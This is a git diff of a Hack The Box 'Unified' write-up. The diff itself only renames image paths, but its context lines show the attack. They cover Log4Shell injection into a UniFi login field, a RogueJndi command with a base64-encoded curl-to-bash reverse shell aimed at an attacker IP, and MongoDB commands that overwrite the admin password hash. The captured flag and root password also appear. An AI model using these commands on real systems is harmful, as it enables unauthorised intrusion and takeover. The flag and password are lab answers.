@@ -7,7 +7,7 @@ competition: 'htb'
 ---
 ## Nmap Recon
 
-![Screenshot 2026-02-05 at 09.20.09.png](/image/writing/competition/htb-unified/1.png)
+![Screenshot 2026-02-05 at 09.20.09.png](/image/writing/competition/HTB-unified/1.png)
 
 There is a UniFi network application version 6.4.54 running on port 8443.
 
@@ -21,11 +21,11 @@ tcpdump -i utun4 port 389
 
 Then, we inject an LDAP request to the `remember` field  of the login POST request.
 
-![Screenshot 2026-02-06 at 21.24.17.png](/image/writing/competition/htb-unified/2.png)
+![Screenshot 2026-02-06 at 21.24.17.png](/image/writing/competition/HTB-unified/2.png)
 
 Our machine record the LDAP request made by the server, indicating that the server is vulnerable to Log4Shell.
 
-![Screenshot 2026-02-07 at 04.46.01.png](/image/writing/competition/htb-unified/3.png)
+![Screenshot 2026-02-07 at 04.46.01.png](/image/writing/competition/HTB-unified/3.png)
 
 ## Initiating a Reverse Shell
 
@@ -77,7 +77,7 @@ echo "curl 10.10.15.207:4444" | base64
 rogue-jndi % java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,Y3VybCAxMC4xMC4xNS4yMDc6NDQ0NAo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.207"
 ```
 
-![Screenshot 2026-02-07 at 10.30.35.png](/image/writing/competition/htb-unified/4.png)
+![Screenshot 2026-02-07 at 10.30.35.png](/image/writing/competition/HTB-unified/4.png)
 
 Once the reverse shell is achieved, we upgrade it into a tty by using the following command:
 
@@ -85,11 +85,11 @@ Once the reverse shell is achieved, we upgrade it into a tty by using the follow
 script /dev/null -c bash
 ```
 
-![Screenshot 2026-02-07 at 10.32.30.png](/image/writing/competition/htb-unified/5.png)
+![Screenshot 2026-02-07 at 10.32.30.png](/image/writing/competition/HTB-unified/5.png)
 
 The first flag (user.txt) was found at `/home/michael/user.txt` : 6ced1a6a89e666c0620cdb10262ba127
 
-![Screenshot 2026-02-07 at 10.33.47.png](/image/writing/competition/htb-unified/6.png)
+![Screenshot 2026-02-07 at 10.33.47.png](/image/writing/competition/HTB-unified/6.png)
 
 ## Privilege Escalation
 
@@ -105,7 +105,7 @@ To  get the hashed password, we execute the following command, which uses the ev
  mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 ```
 
-![Screenshot 2026-02-07 at 11.04.11.png](/image/writing/competition/htb-unified/7.png)
+![Screenshot 2026-02-07 at 11.04.11.png](/image/writing/competition/HTB-unified/7.png)
 
 The identifier is $6$ which means that it is a SHA-512. Therefore, we create a new SHA-512 hashed password to replace it using this command:
 
@@ -122,7 +122,7 @@ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb00
 
 Then, we can login to the UniFi page using the credentials, and enable SSH under settings → Site. The password is `NotACrackablePassword4U2022`
 
-![Screenshot 2026-02-07 at 10.50.14.png](/image/writing/competition/htb-unified/8.png)
+![Screenshot 2026-02-07 at 10.50.14.png](/image/writing/competition/HTB-unified/8.png)
 
 We then initiate an SSH connection using the credential, and retrieve the root flag:
 
